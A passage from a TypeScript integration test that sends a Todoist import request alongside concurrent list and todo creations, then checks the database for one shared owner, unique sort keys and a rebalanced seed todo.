      const res = await app.request('/api/notes/import/todoist', {
        method: 'POST',
        headers: authHdrs,
        body: form,
      });
      return { status: res.status, body: (await res.json()) as Record<string, unknown> };
    };

    const [importRes, listRes1, listRes2, ...createResults] = await Promise.all([
      importReq(),
      rpc('notes/todos/lists/create', ownerHeaders, { name: 'Concurrent List A', color: 'blue', sections: [] }),
      rpc('notes/todos/lists/create', ownerHeaders, { name: 'Concurrent List B', color: 'emerald', sections: [] }),
      ...Array.from({ length: 6 }, (_, i) => rpc('notes/todos/create', ownerHeaders, { title: `Manual Concurrent ${i}` })),
    ]);

    expect(importRes.status, JSON.stringify(importRes.body)).toBe(201);
    expect(listRes1.status, JSON.stringify(listRes1.body)).toBe(200);
    expect(listRes2.status, JSON.stringify(listRes2.body)).toBe(200);
    for (const cr of createResults) {
      expect(cr.status, JSON.stringify(cr.body)).toBe(200);
    }

    const createdTodoIds = [
      ...((importRes.body as unknown as TodoistImportResult).todoIds ?? []),
      ...createResults.map((r) => String(r.body.todoId)),
    ];
    expect(createdTodoIds).toHaveLength(266);

    const allIds = [seedTodoId, ...createdTodoIds];
    const ownerTodos = await admin(async (c) =>
      (await c.query<{ id: string; owner_user_id: string; sort_key: string }>(
        `SELECT id, owner_user_id, sort_key FROM ludy_notes.todo WHERE org_id = $1 AND id = ANY($2::uuid[]) ORDER BY sort_key ASC, id ASC`,
        [orgId, allIds],
      )).rows,
    );
    expect(ownerTodos).toHaveLength(267);
    const ownerUserId = ownerTodos[0]!.owner_user_id;
    expect(ownerTodos.every((r) => r.owner_user_id === ownerUserId)).toBe(true);
    expect(new Set(ownerTodos.map((r) => r.sort_key)).size).toBe(267);
    expect(ownerTodos.every((r) => r.sort_key.length <= 48)).toBe(true);
    const rebalancedSeed = ownerTodos.find((r) => r.id === seedTodoId);
    expect(rebalancedSeed).toBeDefined();
    expect(rebalancedSeed!.sort_key).not.toBe(tightKey);

    const ownerLists = await admin(async (c) =>
      (await c.query<{ id: string; sort_key: string }>(
        `SELECT id, sort_key FROM ludy_notes.todo_list WHERE org_id = $1 AND owner_user_id = $2 AND deleted_at IS NULL ORDER BY sort_key ASC, id ASC`,
        [orgId, ownerUserId],
      )).rows,
    );
    expect(ownerLists.length).toBeGreaterThanOrEqual(3);
    expect(new Set(ownerLists.map((r) => r.sort_key)).size).toBe(ownerLists.length);
  });
});
